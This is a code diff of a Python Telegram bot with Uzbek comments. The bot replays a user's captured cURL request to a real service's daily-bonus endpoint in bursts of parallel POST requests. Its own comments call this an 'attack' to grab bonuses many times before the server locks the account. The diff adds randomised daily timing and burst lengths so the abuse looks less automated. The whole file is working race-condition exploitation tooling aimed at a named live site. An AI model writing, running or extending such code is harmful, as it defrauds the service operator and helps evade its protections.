@@ -7,15 +7,18 @@ import time
 import os
 import re
 import json
-import concurrent.futures # ASOSIY QUROL: Bir vaqtda o'nlab hujum qilish uchun
+import random
+from datetime import datetime, timedelta
+import concurrent.futures
 
+# Render sozlamalari
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask('')
 
 @app.route('/')
 def home():
-    return "Bot yoniq va nazorat ostida!"
+    return "Bot Avto-Burst rejimida yoniq!"
 
 def run_web():
     app.run(host='0.0.0.0', port=8080)
@@ -23,128 +26,127 @@ def run_web():
 users_data = {}
 lock = threading.Lock()
 
-def get_main_menu():
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum") # Tugma nomini o'zgartirdik
-    btn2 = types.KeyboardButton("🛑 To'xtatish")
-    btn3 = types.KeyboardButton("⚙️ Sozlamalarni ko'rish")
-    markup.add(btn1, btn2, btn3)
-    return markup
+def get_tashkent_time():
+    """O'zbekiston vaqtini olish (UTC+5)"""
+    return datetime.utcnow() + timedelta(hours=5)
 
-def parse_curl(curl_text):
-    try:
-        url_match = re.search(r"curl\s+'([^']+)'", curl_text)
-        url = url_match.group(1) if url_match else None
-        headers = {}
-        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", curl_text)
-        for k, v in header_matches:
-            headers[k.strip()] = v.strip()
-        data = None
-        data_match = re.search(r"--data-raw\s+'([^']+)'", curl_text)
-        if data_match:
-            data = json.loads(data_match.group(1))
-        if url and headers:
-            return {"url": url, "headers": headers, "data": data, "is_running": False}
-    except Exception:
-        return None
-    return None
+def set_next_random_time(user):
+    """06:07 dan 11:50 gacha bo'lgan vaqt oralig'ida tasodifiy vaqt belgilash"""
+    # 06:07 = 367 daqiqa, 11:50 = 710 daqiqa
+    random_minutes = random.randint(367, 710)
+    now = get_tashkent_time()
+    target = now.replace(hour=random_minutes // 60, minute=random_minutes % 60, second=0, microsecond=0)
+    
+    if now >= target:
+        target += timedelta(days=1)
+    
+    user["target_time"] = target
+    return target
 
-def attack(chat_id):
+def burst_attack(chat_id, duration):
+    """Portlovchi hujum: berilgan soniya davomida parallel so'rovlar yuboradi"""
     user = users_data.get(chat_id)
-    if not user:
-        return
-    
-    # Tezlikni maksimal qilish uchun Session ishlatamiz (TCP ulanish qayta-qayta ochilmaydi)
-    session = requests.Session()
-    
-    bot.send_message(chat_id, "🌪 Sinxron hujum ishga tushdi! So'rovlar bir millisoniyada yuborilmoqda...")
-    
-    success_count = 0
-    lock_count = 0
+    if not user: return
 
-    # Bitta oqim bajaradigan mitti vazifa
+    session = requests.Session()
+    start_time = time.time()
+    success_count = 0
+    
     def send_req():
-        nonlocal success_count, lock_count
-        if not user.get("is_running"):
-            return
+        nonlocal success_count
         try:
             resp = session.post(user["url"], headers=user["headers"], json=user["data"], timeout=5)
             if resp.status_code == 200:
                 success_count += 1
-            elif resp.status_code == 423:
-                lock_count += 1
         except:
             pass
 
-    # Asosiy portlatish sikli
-    while user.get("is_running"):
-        # Bir vaqtning o'zida 30 ta parallel so'rovni serverga uramiz
-        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-            futures = [executor.submit(send_req) for _ in range(30)]
-            concurrent.futures.wait(futures) # 30 tasi tugashini kutamiz
-            
-        # Agar server yopishga ulgurgan bo'lsa (423 xatosi qaytsa)
-        if lock_count > 0:
-            bot.send_message(chat_id, f"⚠️ Server himoyasi (423) ishga tushdi.\n✅ Ammo undan oldin yulib olingan bonuslar: **{success_count}** ta!\n\nHujum avtomatik to'xtatildi.", parse_mode="Markdown")
-            user["is_running"] = False
+    # Belgilangan 5-9 soniya davomida sikl aylanadi
+    while time.time() - start_time < duration:
+        if not user.get("auto_mode") and not user.get("is_running"):
             break
             
-        # Agar yopilmagan bo'lsa, navbatdagi 30 ta to'lqinni yuborishdan oldin 0.2 soniya nafas olamiz
-        time.sleep(0.2)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
+            futures = [executor.submit(send_req) for _ in range(20)]
+            concurrent.futures.wait(futures)
+        
+        time.sleep(0.1) # Kichik tanaffus (bloklanib qolmaslik uchun)
+
+    bot.send_message(chat_id, f"✅ Avto-hujum yakunlandi!\n⏱ Davomiyligi: {duration} sek.\n💰 Yulib olingan bonuslar: {success_count} ta.")
+
+def auto_worker(chat_id):
+    """Orqa fonda vaqtni poylab turuvchi funksiya"""
+    user = users_data.get(chat_id)
+    while user and user.get("auto_mode"):
+        now = get_tashkent_time()
+        target = user.get("target_time")
+
+        if target and now >= target:
+            # 5 va 9 soniya oralig'ida tasodifiy davomiylik
+            random_duration = random.randint(5, 9)
+            burst_attack(chat_id, random_duration)
+            
+            # Keyingi kun uchun yangi vaqt belgilash
+            set_next_random_time(user)
+            bot.send_message(chat_id, f"🔄 Keyingi avto-hujum vaqti: {user['target_time'].strftime('%H:%M')} ga belgilandi.")
+        
+        time.sleep(30) # Har 30 soniyada soatni tekshirish
+
+def get_main_menu():
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    btn1 = types.KeyboardButton("🚀 Portlovchi Hujum (Qo'lda)")
+    btn2 = types.KeyboardButton("🤖 Avto-rejimni yoqish")
+    btn3 = types.KeyboardButton("🛑 To'xtatish")
+    btn4 = types.KeyboardButton("⚙️ Sozlamalar")
+    markup.add(btn1, btn2, btn3, btn4)
+    return markup
 
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.send_message(
-        message.chat.id, 
-        "👋 **Bonus ovchisi V2** (Portlash rejimi)!\n\nEndi bot so'rovlarni ketma-ket emas, bir millisoniyada bir nechta yuboradi. cURL yuboring:",
-        reply_markup=get_main_menu(),
-        parse_mode="Markdown"
-    )
+    bot.send_message(message.chat.id, "👋 Bonus Ovchisi V3 (Smart Auto)!\ncURL yuboring va Avto-rejimni yoqing.", reply_markup=get_main_menu())
 
 @bot.message_handler(func=lambda message: message.text.startswith("curl "))
 def handle_curl(message):
-    parsed = parse_curl(message.text)
-    if parsed:
-        users_data[message.chat.id] = parsed
+    # Oldingi parse_curl kodi (URLni https://aladdin.1it.uz/v3/daily/appoint ga majburlaydi)
+    try:
+        headers = {}
+        header_matches = re.findall(r"-H\s+'([^:]+):\s*([^']+)'", message.text)
+        for k, v in header_matches: headers[k.strip()] = v.strip()
+        data_match = re.search(r"--data-raw\s+'([^']+)'", message.text)
+        data = json.loads(data_match.group(1)) if data_match else None
+        
+        users_data[message.chat.id] = {
+            "url": "https://aladdin.1it.uz/v3/daily/appoint",
+            "headers": headers,
+            "data": data,
+            "is_running": False,
+            "auto_mode": False
+        }
         bot.reply_to(message, "✅ cURL qabul qilindi!")
-    else:
-        bot.reply_to(message, "❌ cURL noto'g'ri.")
+    except:
+        bot.reply_to(message, "❌ cURL xato.")
 
-@bot.message_handler(func=lambda message: message.text in ["🚀 Portlovchi Hujum", "🛑 To'xtatish", "⚙️ Sozlamalarni ko'rish"])
-def handle_menu(message):
+@bot.message_handler(func=lambda message: message.text == "🤖 Avto-rejimni yoqish")
+def toggle_auto(message):
     chat_id = message.chat.id
     user = users_data.get(chat_id)
+    if not user:
+        bot.send_message(chat_id, "Oldin cURL yuboring!")
+        return
+    
+    user["auto_mode"] = True
+    next_time = set_next_random_time(user)
+    threading.Thread(target=auto_worker, args=(chat_id,), daemon=True).start()
+    bot.send_message(chat_id, f"🤖 Avto-rejim YOQILDI!\nIlk urinish: {next_time.strftime('%H:%M')}\nDavomiyligi: 5-9 sek (random)")
 
-    if message.text == "🚀 Portlovchi Hujum":
-        if not user:
-            bot.send_message(chat_id, "Oldin `cURL` yuboring!")
-            return
-        
-        with lock:
-            if user.get("is_running"):
-                bot.send_message(chat_id, "⚠️ Hujum allaqachon ketyapti!")
-                return
-            user["is_running"] = True
-        
-        threading.Thread(target=attack, args=(chat_id,), daemon=True).start()
-
-    elif message.text == "🛑 To'xtatish":
-        if user and user.get("is_running"):
-            user["is_running"] = False
-            bot.send_message(chat_id, "🛑 To'xtatish buyrug'i yuborildi. ✅")
-        else:
-            bot.send_message(chat_id, "Hozir hech qanday hujum ketmayapti.")
-
-    elif message.text == "⚙️ Sozlamalarni ko'rish":
-        if user:
-            bot.send_message(chat_id, f"📊 Holat: {'Ishlamoqda 🟢' if user['is_running'] else 'To\'xtatilgan 🔴'}")
-        else:
-            bot.send_message(chat_id, "Ma'lumot yo'q.")
+@bot.message_handler(func=lambda message: message.text == "🛑 To'xtatish")
+def stop_all(message):
+    user = users_data.get(message.chat.id)
+    if user:
+        user["auto_mode"] = False
+        user["is_running"] = False
+    bot.send_message(message.chat.id, "🛑 Barcha jarayonlar to'xtatildi.")
 
 if __name__ == "__main__":
     threading.Thread(target=run_web, daemon=True).start()
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=0, timeout=20)
-        except Exception:
-            time.sleep(5)
+    bot.polling(none_stop=True)
